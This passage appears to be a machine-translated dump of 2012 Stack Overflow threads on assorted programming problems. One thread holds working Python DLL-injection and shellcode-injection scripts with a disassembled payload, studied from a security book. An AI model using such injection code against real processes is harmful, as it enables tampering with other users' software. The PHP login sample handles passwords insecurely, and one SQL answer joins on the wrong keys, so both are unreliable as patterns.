
* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:02:59.240

我想你可能在时间上遇到了一些问题......

也许您应该实现一些基本的日志记录（请求开始和完成，......）以更好地了解问题。

我已经看到使用 WebClient 和不同并行请求的一些问题，也许你应该检查一下。据我所知，WebClient 回调使用 UI 威胁，这也可能是一个问题，当它发生在早期时（可能是当你的 VM 开始请求并提前初始化时）......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:39:56.657

我不知道这是否有帮助，但我通常在后面的代码中执行此操作以设置视图的 ViewModel。

```
public MainPage()
{
    InitializeComponent();
    MainPageVMProperty = new ViewModels.MainPageViewModel();
}

public ViewModels.MainPageViewModel MainPageVMProperty { get; set; }

protected override void OnNavigatedTo(System.Windows.Navigation.NavigationEventArgs e)
{
    base.OnNavigatedTo(e);
    LayoutRoot.DataContext = MainPageVMProperty;
} 
```

# javascript - 每个对象的 addEventHandler VS 循环遍历事件中的对象

> ID：10989293
> 
> 赞同：0
> 
> 时间：2012-06-12T00:50:53.523
> 
> 标签：javascript, javascript-events

这是一个简单的问题，我只想了解一下：

我有 1000 个 JavaScript 对象。

情况 1：这些对象中的每一个都为按钮添加了一个事件侦听器，因此浏览器会运行所有这些函数并调用处理脚本。

情况 2：某个对象向按钮添加了一个事件侦听器，并通过循环遍历所有对象并在每个对象上调用处理脚本来对其做出反应。

我根本无法推断出哪个更快，而且我也知道可能有比这更多的方法，那么，见解？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:45:50.447

我相信差异可以忽略不计，如果你真的很好奇，你可以通过[jsPerf](http://jsperf.com/)运行每个场景来找出答案。

在这种情况下，我认为没有任何理由不采用更易于维护的解决方案，并且将一个事件处理程序附加到内部循环的按钮上，将来调试起来会容易得多。

# python - CreateRemoteThread() 未按预期运行

> ID：10989296
> 
> 赞同：1
> 
> 时间：2012-06-12T00:51:16.370
> 
> 标签：python, dll, code-injection, createremotethread

我正在阅读 Gray Hat Python 这本书，并且在使用上述注入技术时遇到了麻烦。

DLL 注入代码成功运行，但 dll 中的代码似乎没有执行，也没有创建消息框。

代码注入声称执行成功，但终止进程的shellcode没有正确执行，接收注入的进程立即停止工作。

这些问题是因为 Windows 7 和这本书有点过时吗？或者会不会有其他问题？我正在运行 Windows 7 Ultimate 64 位。

无论如何，这里是代码：

**dll_inject.py**

```
import sys
from ctypes import *

PAGE_READWRITE      = 0x04
PROCESS_ALL_ACCESS  = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM         = (0x1000 | 0x2000)

kernel32    = windll.kernel32
pid         = sys.argv[1]
dll_path    = sys.argv[2]

dll_len = len(dll_path)

#Get a handle to the process we are injecting into
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*} Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

#Allocate some space for the DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

#Write the DLL path into the allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

#We need to resolve the address for LoadLibraryA
h_kernel32  = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib   = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

#Now we try to create the remote thread, with the entry point set to
#LoadlibraryA and a pointer to the DLL path as its single parameter
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address,
                                   0, byref(thread_id)):
    print "[*] Failed in inject DLL. Exting."
    sys.exit(0) 
```

**code_inject.py**

```
import sys
from ctypes import *

#We set the EXECUTE access mask so that our shellcode will
#execute in the memory block we have allocated
PAGE_EXECUTE_READWRITE  = 0x00000040
PROCESS_ALL_ACCESS      = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM             = (0x1000 | 0x2000)

if not sys.argv[1] or not sys.argv[2]:
    print "Code Injector: ./code_injector.py <pid to inject> <pid to kill>"
    sys.exit(0)

kernel32    = windll.kernel32
pid         = int(sys.argv[1])
pid_to_kill = sys.argv[2]

# win32_exec - EXITFUNC=thread CMD=taskkill /PID AAAAAAAA Size=152
# Encoder=None http://metasploit.com

shellcode = \
"\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
"\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
"\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
"\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
"\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
"\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
"\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
"\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"

padding         = 4 - (len(pid_to_kill))
replace_value   = pid_to_kill + ("\x00" * padding)
replace_string  = "\x41" * 4

shellcode       = shellcode.replace(replace_string, replace_value)
code_size       = len(shellcode)

#Get a handle to the process we are injecting into.
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

#Allocate some space for the shellcode
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size,
                                      VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

#Write out the shellcode
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size,
                            byref(written))

#Now we create the remote thread and point its entry routine
#to be head of our shellcode
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None,
                                   0, byref(thread_id)):
    print "[*] Failed to inject process-killing shellcode. Exiting."
    sys.exit(0)

print "[*] Remote thread created with a thread ID of: 0x%0xx" % thread_id.value
print "[*] Process %s should not be running anymore!" % pid_to_kill
print "[*] Remote thread with ID 0x%08x created" % thread_id.value 
```

**注入的.dll**

```
// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
      )
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL,"Hello from the process!","I am inside the process you injected!",MB_OK);
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
  break;
}
return TRUE;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T06:33:09.287

我实际上已经搜索了几次，但从我看到的所有答案来看，据说 Python 的 ctypes 模块可以正常工作，即使在 64 位版本的 Python 上也是如此。我个人无法让远程代码注入正常运行，但老实说，我也没有真正花太多时间尝试对其进行故障排除。至于你的具体问题：

我在使用 ctypes 时发现的一件事是，当您明确指定 argtypes 和 restype 时，它​​往往会更加合作。实际上，如果我没记错的话，在我指定所涉及的类型之前，我有几乎相同的代码拒绝正常运行。我有[一个旧版本的存储库](https://github.com/Juntalis/python-ctypes-sandbox/tree/0d0d278c77582258098d745ff6bc9ac05e667dc4)，其中包含您在名为[_kernel32.py](https://raw.github.com/Juntalis/python-ctypes-sandbox/0d0d278c77582258098d745ff6bc9ac05e667dc4/_kernel32.py)的文件中使用的 API 的所有声明。尝试插入这些声明，看看是否可以修复您的`dll_inject.py`脚本。

至于`code_inject.py`剧本，我认为 TreeMonkie 的评论是正确的。虽然 64 位反汇编程序没有出现任何我能真正遵循的东西，但使用 32 位指令反汇编它却出现了以下结果：

```
.686p
.mmx
.model flat

; Segment type: Pure code
seg000 segment byte public 'CODE' use32
    assume cs:seg000
    assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
        cld
        call sub_4A
        mov eax, [ebp+3Ch]
        mov edi, [ebp+eax+78h]
        add edi, ebp
        mov ecx, [edi+18h]
        mov ebx, [edi+20h]
        add ebx, ebp

        loc_17:
        dec ecx
        mov esi, [ebx+ecx*4]
        add esi, ebp
        xor eax, eax
        cdq

        loc_20:
        lodsb
        test al, al
        jz short loc_2C
        ror edx, 0Dh
        add edx, eax
        jmp short loc_20

        loc_2C:
        cmp edx, [esp+4]
        jnz short loc_17
        mov ebx, [edi+24h]
        add ebx, ebp
        mov cx, [ebx+ecx*2]
        mov ebx, [edi+1Ch]
        add ebx, ebp
        mov ebx, [ebx+ecx*4]
        add ebx, ebp
        mov [esp+4], ebx
        retn

    sub_4A proc near
        xor eax, eax
        mov eax, fs:[eax+30h]
        test eax, eax
        js short loc_60
        mov eax, [eax+0Ch]
        mov esi, [eax+1Ch]
        lodsd
        mov ebp, [eax+8]
        jmp short loc_69

        loc_60:
        mov eax, [eax+0B0h]
        mov ebp, [eax+3Ch]

        loc_69:
        pop edi
        xor esi, esi
        pusha
        push esi
        mov eax, edi
        add eax, 7Bh
        push eax
        push 60E0CEEFh
        push 0E8AFE98h
        push edi
        jmp edi
    sub_4A endp

    strCmd_exeCTask db 'cmd.exe /c taskkill /PID AAAA',0
    seg000 ends
end 
```

无论如何，如果是，实际上是 32 位 shellcode，它不会在 64 位进程中工作。（虽然我会说，鉴于我对 64 位汇编的了解很少，我很可能错认为它是 32 位）

最后，您可能需要查看[pyinject 项目中的 dllinject.py 文件](https://github.com/psychomario/pyinject/blob/master/dllinject.py)。看起来他好像在他的课堂上实现了远程 shellcode 注入。

希望有帮助。

# php - python中的PHP空函数

> ID：10989297
> 
> 赞同：3
> 
> 时间：2012-06-12T00:51:30.883
> 
> 标签：php, python

我有以下 PHP 代码，对于我的生活，我想不出一种简单而优雅的方法来实现 python 中的 empty() 函数来检查索引是否在列表中定义。

```
$counter = 0;
$a = array();
for ($i=0;$i<100;$i++){
  $i = ($i > 4) ? 0 : $i;
  if empty($a[$i]){
    $a[$i]=array();
  }
  $a[$i][] = $counter;
  $counter++;
} 
```

如果我做

```
if a[i] is None 
```

然后我得到索引超出范围。但是，我知道通过多个步骤来做到这一点，但这不是我想要的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:01:15.897

PHP 数组和 Python 列表是不等价的。PHP 数组实际上是[关联容器](http://php.net/manual/en/language.types.array.php)：

> PHP 中的数组实际上是一个有序映射。映射是将值与键相关联的类型。这种类型针对几种不同的用途进行了优化；它可以被视为数组、列表（向量）、哈希表（映射的实现）、字典、集合、堆栈、队列等等。

在 Python 中，地图数据结构被定义为[字典](http://docs.python.org/library/stdtypes.html#typesmapping)：

> 映射对象将可散列值映射到任意对象。映射是可变对象。目前只有一种标准映射类型，即字典。

该`empty()`功能[有多种用途](http://php.net/manual/en/function.empty.php)。在您的使用上下文中，它相当于 Python`in`运算符：

```
>>> a = {}
>>> a[1] = "x"
>>> a[3] = "y"
>>> a[5] = "z"
>>> i = 3
>>> i in a
True
>>> i = 2
>>> i in a
False 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:03:33.213

如果您尝试使用列表执行此操作，则必须将该索引实际设置为无，否则该元素将不存在，您可能会尝试检查列表末尾之后的索引。

```
>>> i = [None]
>>> i
[None]
>>> i = [None, None]
>>> i
[None, None]
>>> i[1] is None
True 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-10-14T10:41:10.557

```
# variable may not exsists    
if (variable in vars() or variable in globals()) and variable != "" and variable == False:
    pass 
```

# jquery - jquery中.closest，parent，next函数的困难

> ID：10989302
> 
> 赞同：0
> 
> 时间：2012-06-12T00:52:15.370
> 
> 标签：jquery

所以我试图使用 .closest 函数并且遇到了问题，所以我选择了别的东西，但这让我很难过，所以试图弄清楚。

这是html：

```
 <div class="faqW">
        <div class="faqQues2"> the question goes here </div>
        <br/>
        <div class="faqAns2"> answere to faq question here.</div>
    </div><!-- faq wrap ender --> 
```

这是隐藏答案的CSS（完成后将更改为js隐藏）

```
.faqAns2{
    background-color:#CC6;
    color:black;
        display:none;
} 
```

**这是我试图**使用的 jq ：

```
var question = $('.faqQues');
var answer = $('.faqAns');
var question2= $('.faqQues2'); 
```

（不同的尝试没有结果）

尝试1：

```
question2.click( function(){
    $(this).parent().next('.faqAns2').slideToggle(500); 
}); 
```

或者

```
question2.click( function(){
    $(this).parent('.faqW').next('.faqAns2').slideToggle(500);  
}); 
```

尝试2：

```
 question2.click( function(){
    $('.faqW',$(this)).closest('.faqAns2').slideToggle(500);    
}); 
```

尝试3：

```
 question2.click( function(){
$(this).next('.faqAns2').slideToggle(500);  
}); 
```

我尝试了很多方法，包括重新排列 .parent 的 html 等，但无济于事。

我想要的是，当单击问题时，会切换显示最接近的答案。

我无法弄清楚我做错了什么。

先谢谢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:02:49.553

如果您遍历父元素，则`.next()`匹配元素的直接兄弟。

要搜索您的孩子，`.faqW`可以使用，或搜索您可以使用`.find()`的下一个答案，它不仅搜索直接兄弟，而且获取所有匹配的兄弟。`.faqQues2``nextAll()`

**$.find() - [http://jsfiddle.net/urLqE/](http://jsfiddle.net/urLqE/)：**

```
question2.click( function(){
    $(this).parent().find('.faqAns2').slideToggle(500); 
}); 
```

​</p>

**$.nextAll() - [http://jsfiddle.net/urLqE/1/](http://jsfiddle.net/urLqE/1/)：**

```
question2.click( function(){
    $(this).nextAll('.faqAns2').slideToggle(500); 
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T01:00:32.120

您需要使用两个 next 调用，因为 next 将只返回直接的下一个兄弟，如果给定，它与选择器匹配。在这里，答案 div 是问题之后的一个 DOM 节点。

```
question2.click( function(){
    $(this).next().next('.faqAns2').slideToggle(500);  
});​ 
```

详细了解 DOM 遍历函数[http://api.jquery.com/category/traversing/](http://api.jquery.com/category/traversing/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T00:56:31.213

'.closest(selector)' 沿着祖先链向上并找到与选择器匹配的第一个祖先。

`.next(selector)`查看下一个元素并仅当它与选择器匹配时才返回下一个元素。它不会寻找与选择器匹配的下一个元素，无论它有多远。如果下一个元素与选择器匹配，它只会返回一些东西。

从一个问题中，要在保存 div 中获得下一个答案，您可以这样做：

```
.nextAll('.faqAns2') 
```

nextAll 将获取与 jQuery 对象中元素之后的选择器匹配的所有兄弟姐妹。

对于您的具体问题，我认为这将起作用：

```
question2.click( function(){
    $(this).nextAll('.faqAns2').slideToggle(500); 
}); 
```

或者，如果您使 HTML 更通用，则可以对所有问题和答案使用相同的 jQuery：

```
<div class="faqW">
    <div class="faqQues"> the question goes here </div>
    <br/>
    <div class="faqAns"> answere to faq question here.</div>
</div><!-- faq wrap ender --> 
```

和 jQuery：

```
$('.faqQues').click(function() {
    $(this).nextAll('.faqAns').slideToggle(500);
}); 
```

由于每个问答对都限制在自己的 div 中，因此您也可以这样做：

```
$('.faqQues').click(function() {
    $(this).closest('.faqW').find('.faqAns').slideToggle(500);
}); 
```

# wpf - 让 WPF 自定义控件库控制以显示正确样式的正确方法是什么？

> ID：10989304
> 
> 赞同：0
> 
> 时间：2012-06-12T00:52:50.103
> 
> 标签：wpf, xaml, custom-controls

我第一次涉足 WPF 自定义控件库池。我在一个单独的解决方案中为我的自定义控件创建了一个项目，该控件只是从 Control 派生的。

在我想使用自定义控件的目标应用程序中，它可以工作，但似乎无法访问默认样式，除非我在 App.xaml 文件中专门添加了引用。我添加了 xmlns 属性，因此控件本身可用。我希望我错过了一些使控件更加独立的设置。因此，在我的目标 WPF 应用程序中，如果我在 App.xaml 中添加注释后显示的行，一切正常（功能和样式）：

```
 <Application.Resources>
     <ResourceDictionary>
        <ResourceDictionary.MergedDictionaries>
            <ResourceDictionary Source="MyStandardStuff.xaml" />
            <!-- How do I avoid having everyone who uses the control having to add the following line?-->
            <ResourceDictionary Source="/MyNewControl;component/Themes/Generic.xaml" />
        </ResourceDictionary.MergedDictionaries>
     </ResourceDictionary>
</Application.Resources> 
```

鉴于我的自定义控件库有一个 Themes 文件夹，其中包含一个包含此表单样式的 Generic.xaml 文件：

```
<Style TargetType="{x:Type local:MyNewControl}">
 <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type local:MyNewControl}">
  ... 
```

有没有办法让它工作而不在 App.xaml 中添加显式引用？

## 编辑

这是随项目创建的 ThemeInfo 属性。

```
[assembly: ThemeInfo(
ResourceDictionaryLocation.None, //where theme specific resource dictionaries are located
//(used if a resource is not found in the page, 
// or application resource dictionaries)
ResourceDictionaryLocation.SourceAssembly //where the generic resource dictionary is located
//(used if a resource is not found in the page, 
// app, or any theme specific resource dictionaries)
)] 
```

## 答案的细节

我不确定这个问题会再次出现，因为事实证明我做了一些愚蠢的事情，但万一发生了……我使用 VS 模板创建了 WPF 自定义控件库。然后我将我的控件类复制并粘贴到 Visual Studio 创建的默认类上。我没有注意到的是 VS 创建了一个静态构造函数，它正在做一些非常重要的事情。在对以下答案的评论中指出了这一点。静态构造函数应该是这样的

```
 static MyNewControl()
    {
        DefaultStyleKeyProperty.OverrideMetadata(typeof(MyNewControl),
            new FrameworkPropertyMetadata(typeof(MyNewControl)));
    } 
```

Once this was in place I could remove the code I added to the target's resource dictionary.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:26:38.897

I would make sure that the xaml file in your control assembly is marked as Page and also make sure that you have the [ThemeInfo](http://msdn.microsoft.com/en-us/library/system.windows.themeinfoattribute.aspx) attribute in the assemblyinfo.cs for your control assembly.

# html - 适用于旧版浏览器的 HTML5 占位符插件

> ID：10989305
> 
> 赞同：0
> 
> 时间：2012-06-12T00:53:11.010
> 
> 标签：html, jquery-plugins, placeholder

是否有一个插件可以模拟 Chrome 和 Safari 对不支持该属性的旧浏览器的 HTML5 占位符属性的处理。

Chrome 如何处理占位符属性：

*   占位符文本以较浅的颜色添加到输入框
*   一旦在输入框中输入字符，占位符文本就会消失

对于较旧的浏览器，插件应该：

*   在输入中隐藏占位符文本，而不是焦点
*   使用 placeholder 属性创建一个标签元素，该元素具有覆盖输入元素的相同值，而不是在输入框中插入值（不希望占位符值影响提交值或其他验证代码）。

我已经花了一些时间浏览可用的插件，但我无法找到像描述的那样工作的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:55:29.793

有*大量*的 jQuery 插件具有与此或类似的功能。搜索“jquery placeholder”并选择一个你喜欢的。

# jquery - 如何在特定位置启动 jQuery Parallax？

> ID：10989311
> 
> 赞同：1
> 
> 时间：2012-06-12T00:54:58.793
> 
> 标签：jquery, jquery-plugins, parallax

我发现了这个水平视差的好例子 [http://www.perandersen.no/sandbox/parallax/](http://www.perandersen.no/sandbox/parallax/) 我想做的唯一修改是让它从屏幕的最右边而不是左边开始，但我不能工作如果出来怎么做

这是使用的Jquery函数

```
<script type="text/javascript">
    var snowboarderPos;
    var balloonPos;

    $(document).ready(function() {
        $("#beginningLink").click(function() {
            $.scrollTo(0,0, {duration: 2000});
        });
        $("#avalancheLink").click(function() {
            $.scrollTo(2000,0, {duration: 2000});
        });
        $("#elevatorLink").click(function() {
            $.scrollTo(4400,0, {duration: 2000});
        });
        $("#wolfLink").click(function() {
            $.scrollTo(7000,0, {duration: 2000});
        });
    });

    $(window).load(function() {
        snowboarderPos = $("#snowboarder").offset();
        balloonPos = $("#ballong").offset();
        window.onscroll = scroll;
        hideScreen();

    });

    function hideScreen() {
        $("#loadingWrap").fadeOut("slow");
        //$('html,body').animate({scrollLeft: $("#info2").offset().top},'slow');

        $("#snowboarder").animate({"top": "-=200px"}, "slow");
        $("#info1").delay(500).animate({"left": "-=200px", "width" : "350px", "fontSize" : "24px"}, "slow");
    }

    function scroll()
    {
        var xPos = window.pageXOffset;
        var element = $("#wrapper");
        var newXPos = Math.abs(xPos /1.1);
        element.css( "left", newXPos );

        element = $("#snowboarder");
        var position = element.position();
        var newXPos = Math.abs(xPos /1.5) + snowboarderPos.left;
        element.css( "left", newXPos );

        element = $("#elevator");
        var position = element.position();
        var newXPos = Math.abs(xPos /1.9) + 2800;
        element.css( "left", newXPos );

        var element = $("#ballong");
        var position = element.position();
        var newXPos = Math.abs(xPos /1.2) + balloonPos.left;
        element.css( "left", newXPos );

        // $("#xpos").text(window.pageXOffset);
    }
</script> 
```

有谁知道我怎么能做到这一点？

非常感谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:21:17.780

由于最后一项具有`id`of `end`，因此只需通过在 URL 末尾附加哈希来跳转到那里。

示例：
[**http ://www.perandersen.no/sandbox/parallax/#end**](http://www.perandersen.no/sandbox/parallax/#end)

也就是说，您可以在窗口加载期间使用已经需要的`.scrollTo`插件在页面加载时跳转到那里。

**例子：**

```
$.scrollTo('#end'); 
```

I made this [**jsFiddle**](http://jsfiddle.net/AY3Ej/1/) that contains the authors website with the *single addition* of the above `.scrollTo()` that answers your question.

# common-lisp - 如何在 common lisp 中将字符串转换为整数？

> ID：10989313
> 
> 赞同：25
> 
> 时间：2012-06-12T00:55:13.817
> 
> 标签：common-lisp

如何在 common lisp 中将字符串转换为整数？例如，如果我输入一个字符串“-64”，我想得到一个整数-64。谢谢。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-06-12T03:51:29.223

幸运的是，该标准提供了一种方法：[PARSE-INTEGER](http://www.lispworks.com/documentation/HyperSpec/Body/f_parse_.htm)。

```
CL-USER> (parse-integer "-64")
-64
3 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-12T00:58:39.893

此页面可能会有所帮助：

[http://hyperpolyglot.org/lisp](http://hyperpolyglot.org/lisp)

# php - Codeigniter SHA1 查询

> ID：10989316
> 
> 赞同：1
> 
> 时间：2012-06-12T00:55:53.787
> 
> 标签：php, codeigniter, sha1

为什么我的密码没有插入数据库

**模型：**

```
function addUser($userData = NULL, $passwordHash)
    {
        $this->db->insert('users',$userData,$passwordHash);
        return TRUE;
    } 
```

**控制器：**

```
public function addUser()
    {
        $data['pageTitle'] = 'GA Add User';
        $this->load->view('_assets/header', $data);
        $this->load->view('addUser', $data);
        $this->load->view('_assets/footer');

        $userData = array(
            'fName' => $this->input->post('userFirstName', TRUE),
            'lName' => $this->input->post('userLastName', TRUE),
            'email' => $this->input->post('userEmail', TRUE)
        );

        $passwordHash = sha1($this->input->post('userPassword', TRUE));

        $this->db->escape($userData);

        $this->user_model->addUser($userData, $passwordHash);

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:00:50.553

编辑：

```
function addUser($userData = NULL)
    {
        $this->db->insert('users',$userData);
        return TRUE;
    }

public function addUser()
    {

        $userData = array(
            'fName' => $this->input->post('userFirstName', TRUE),
            'lName' => $this->input->post('userLastName', TRUE),
            'email' => $this->input->post('userEmail', TRUE),
            'password'=>sha1($this->input->post('userPassword', TRUE))
        );

        $this->user_model->addUser($userData);

        $data['pageTitle'] = 'GA Add User';
        $this->load->view('_assets/header', $data);
        $this->load->view('addUser', $data);
        $this->load->view('_assets/footer');

    } 
```

将密码添加到 $userdata 数组以使其更清晰。并修改了addUser函数。您不需要转义数据，数据库库会为您完成。注意，您必须在脚本末尾加载视图

# sql - 选择 2 张桌子

> ID：10989319
> 
> 赞同：1
> 
> 时间：2012-06-12T00:56:18.753
> 
> 标签：sql, select

我阅读了过去的问题，但我无法解决我的问题:(

这是我的情况。

```
>>table paciente
idPaciente | nombres | apellidos | fecNac | direccion | telefono | idenfermedad | idApoderado

>>table enfermedad
idenfermedad | detalle

>>table apoderado
idApoderado | nameA | apeA 
```

我想得到这个结果：

```
idPaciente | nombres | apellidos | fecNac | direccion | telefono | detalle | nameA | apeA 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:04:56.607

使用主表中的外键表的主键使用 JOIN 子句，这些外键存在于其中。还要注意表别名的使用（即 paciente p），它有助于减少打字:)

```
select 
  p.idPaciente, 
  p.nombres,
  p.apellidos, 
  p.fecNac, 
  p.direccion, 
  p.telefono, 
  e.detalle, 
  a.nameA,
  a.apeA 

from paciente p
join enfermedad e on e.idApoderado = p.idApoderado 
join apoderado a on a.idPaciente = p.idPaciente 
```

并尝试使用 LEFT 和 RIGHT 连接来查看不同的结果集。

```
select 
  p.idPaciente, 
  p.nombres,
  p.apellidos, 
  p.fecNac, 
  p.direccion, 
  p.telefono, 
  e.detalle, 
  a.nameA,
  a.apeA 

from paciente p
left join enfermedad e on e.idApoderado = p.idApoderado 
left join apoderado a on a.idPaciente = p.idPaciente 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T01:00:44.337

这应该有效：

```
SELECT p.idPaciente, p.nombres, p.apellidos, p.fecNac, p.direccion, p.telefono, 
       e.detalle, a.nameA, a.apeA
FROM paciente as p
JOIN enfermedad as e on e.idenfermedad = p.idenfermedad 
JOIN apoderado as a on e.idApoderado = a.idApoderado 
```

# android - 长按状态卡住

> ID：10989326
> 
> 赞同：0
> 
> 时间：2012-06-12T00:57:16.890
> 
> 标签：android

如果我“点击”，它将打印“点击”。但是，一旦我“长按”它只会打印“长按”，无论长度如何。

```
LinearLayout ll = new LinearLayout(this);

ll.setOnClickListener(new OnClickListener(){
    @Override
    public void onClick(View v) 
        System.out.println("click");
    }
});

ll.setOnLongClickListener(new OnLongClickListener(){
    @Override
    public boolean onLongClick(View v) {
        v.setOnTouchListener(new OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        System.out.println("long click");                   
                    case MotionEvent.ACTION_MOVE:
                    case MotionEvent.ACTION_UP:
                }
                return false;
            }                      
        });                     
        return true;
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:09:47.753

可能改变：

```
ll.setOnLongClickListener(new OnLongClickListener(){
    @Override
        public boolean onLongClick(View v) {
        v.setOnTouchListener(new OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
            switch (event.getAction()) {
            case MotionEvent.ACTION_DOWN:
            System.out.println("long click");                   
            case MotionEvent.ACTION_MOVE:
            case MotionEvent.ACTION_UP:
            }
        return false;
        }                      
        });                     
    return true;
    }
}); 
```

到

```
ll.setOnLongClickListener(new OnLongClickListener(){
    @Override
    public boolean onLongClick(View v) {
        System.out.println("long click");  
        v.setOnTouchListener(new OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                    case MotionEvent.ACTION_MOVE:
                    case MotionEvent.ACTION_UP:
                }
                return false;
            }                      
        });                     
        return true;
    }
}); 
```

这样，当它收到长按而不是您“设置”后的触摸事件时，它将打印“长按”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:14:46.890

只是一个 TouchListener 怎么样？它将记录时间`ACTION_DOWN`，如果`ACTION_UP`时间足够长，则从 MotionEvent 中提取坐标。

```
ll.setOnTouchListener(new View.OnTouchListener() {
    Calendar down;
    public boolean onTouch(View v, MotionEvent event) {
        switch(event.getAction()) {
        case MotionEvent.ACTION_DOWN:
            down = Calendar.getInstance();
            break;
        case MotionEvent.ACTION_UP:
            // Only continue if longer than 2 seconds
            if(Calendar.getInstance().getTimeInMillis() - down.getTimeInMillis() > 2000) {
                // Touch coordinates: event.getX(), event.getY()
            }
        }
        return true;
    }
}); 
```

# php - 警告：无法修改标头信息（PHP LOGIN ERROR）

> ID：10989327
> 
> 赞同：0
> 
> 时间：2012-06-12T00:57:22.367
> 
> 标签：php

> **可能重复：**
> [PHP 已发送的标头](https://stackoverflow.com/questions/8028957/headers-already-sent-by-php)

我正在尝试设置一个简单的 php 用户名和密码登录。一切正常，直到我尝试重定向到 login_success.php 页面。所有信息都在下面，请帮助。

```
############### Code 
Warning: Cannot modify header information - headers already sent by (output started at              
.../edits/admon/minastotian/checklogin.php:4) in    
.../edits/admon/minastotian/checklogin.php on line 15 
```

这是 checklogin.php 页面。它打印出上面的错误请帮助。谢谢你。

```
############### Code
<?php
    $host="i'm not telling"; // Host name 
    $username="db_user"; // Mysql username 
    $password="db_password"; // Mysql password 
    $db_name="db_name"; // Database name 
    $tbl_name="users"; // Table name

    // Connect to server and select databse.
    mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
    mysql_select_db("$db_name")or die("cannot select DB");

    // username and password sent from form 
    $myusername=$_POST['myusername']; 
    $mypassword=$_POST['mypassword']; 

    // To protect MySQL injection (more detail about MySQL injection)
    $myusername = stripslashes($myusername);
    $mypassword = stripslashes($mypassword);
    $myusername = mysql_real_escape_string($myusername);
    $mypassword = mysql_real_escape_string($mypassword);
    $sql="SELECT * FROM $tbl_name WHERE username='$myusername' and     password='$mypassword'";
    $result=mysql_query($sql);

    // Mysql_num_row is counting table row
    $count=mysql_num_rows($result);

    // If result matched $myusername and $mypassword, table row must be 1 row
    if($count==1){
        // Register $myusername, $mypassword and redirect to file "login_success.php"
        $_SESSION['myusername'] = 'myusername';
        $_SESSION['mypassword'] = 'mypassword';
        header("location:login_success.php");
    }
    else {
        echo "Wrong Username or Password";
    }

   ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:02:50.303

